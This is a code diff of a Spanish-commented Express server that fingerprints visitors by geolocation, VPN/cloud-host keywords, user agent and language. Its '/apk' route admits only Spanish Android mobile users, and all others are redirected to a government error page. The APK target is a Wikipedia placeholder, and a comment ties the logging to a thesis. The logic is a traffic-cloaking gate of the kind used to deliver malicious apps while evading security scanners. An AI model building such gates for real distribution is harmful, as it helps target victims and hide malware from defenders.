@@ -16,7 +16,7 @@ function getIP(req) {
   return req.headers["x-real-ip"] || req.socket.remoteAddress || "";
 }
 
-// 🌍 geolocalización con timeout
+// 🌍 geolocalización
 async function getGeo(ip) {
   try {
     const res = await axios.get(`https://ipapi.co/${ip}/json/`, {
@@ -28,17 +28,15 @@ async function getGeo(ip) {
   }
 }
 
-// 🤖 detección heurística mejorada
+// 🤖 detección heurística VPN/proxy
 function isSuspicious(geo) {
   if (!geo || !geo.org) return true;
 
   const org = geo.org.toLowerCase();
 
-  // flags directos
   if (geo.proxy === true) return true;
   if (geo.hosting === true) return true;
 
-  // keywords
   const suspiciousKeywords = [
     "amazon", "google", "digitalocean", "ovh", "azure", "microsoft",
     "linode", "vultr", "hetzner", "cloudflare", "fastly", "akamai",
@@ -48,73 +46,89 @@ function isSuspicious(geo) {
   return suspiciousKeywords.some(kw => org.includes(kw));
 }
 
-// 🧠 evaluación principal
+// 🧠 función de evaluación reutilizable
+function evaluateAccess(req, geo) {
+  const ua = req.headers["user-agent"] || "";
+  const language = req.headers["accept-language"] || "";
+
+  // 🔥 detección mejorada
+  const isAndroid = /android/i.test(ua);
+  const isMobile = /mobile/i.test(ua);
+  const isRealAndroid = isAndroid && isMobile;
+
+  const isSpain = geo.country === "ES";
+  const isSpanishLang = language.toLowerCase().includes("es");
+  const vpn = isSuspicious(geo);
+
+  let score = 0;
+
+  if (isSpain) score += 3;
+  if (isRealAndroid) score += 3;
+  if (isSpanishLang) score += 1;
+
+  if (!isRealAndroid) score -= 5;
+  if (vpn) score -= 6;
+  else score += 2;
+
+  if (!geo.country) score -= 2;
+
+  const allow = score >= 6;
+
+  return {
+    allow,
+    score,
+    debug: {
+      ua,
+      ipCountry: geo.country,
+      org: geo.org,
+      vpn,
+      isRealAndroid,
+      isSpanishLang
+    }
+  };
+}
+
+// 🧠 endpoint check
 app.get("/check", async (req, res) => {
   const ip = getIP(req);
   const geo = await getGeo(ip);
 
-  const ua = req.headers["user-agent"] || "";
-  const agent = useragent.parse(ua);
+  const result = evaluateAccess(req, geo);
 
-  const language = req.headers["accept-language"] || "";
-
-  // 📍 checks
-  const isSpain = geo.country === "ES";
-  const isAndroid = agent.os.toString().toLowerCase().includes("android");
-  const isSpanishLang = language.toLowerCase().includes("es");
-  const vpn = isSuspicious(geo);
-
-  // 🧮 scoring mejorado
-  let score = 0;
-
-  if (isSpain) score += 2;
-  if (isAndroid) score += 2;
-  if (isSpanishLang) score += 1;
-
-  if (!isAndroid) score -= 10; // penalizar desktop
-
-  if (vpn) score -= 10;
-  else score += 2;
-
-  // fallback si geo falla
-  if (!geo.country) score -= 2;
-
-  const allow = score >= 3;
-
-  // 📊 LOG PARA TFG
   console.log("---- VISITA ----");
   console.log({
     ip,
-    country: geo.country,
-    org: geo.org,
-    vpn,
-    isAndroid,
-    isSpanishLang,
-    score,
-    allow
+    ...result
   });
 
-  res.json({
-    allow,
-    score
-  });
+  res.json(result);
 });
 
-// 🚀 rutas finales
-app.get("/apk", (req, res) => {
-  res.redirect("https://es.wikipedia.org/wiki/Bien_(filosof%C3%ADa)");
+// 🔒 ruta protegida REAL
+app.get("/apk", async (req, res) => {
+  const ip = getIP(req);
+  const geo = await getGeo(ip);
+
+  const result = evaluateAccess(req, geo);
+
+  if (!result.allow) {
+    return res.redirect("/home");
+  }
+
+  return res.redirect("https://es.wikipedia.org/wiki/Bien_(filosof%C3%ADa)");
 });
 
+// fallback
 app.get("/home", (req, res) => {
   res.redirect("https://www.exteriores.gob.es/es/Paginas/Error-Cita.aspx");
 });
 
-// 🌐 root
+// root
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// 🌐 puerto compatible con Render
+// puerto render
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
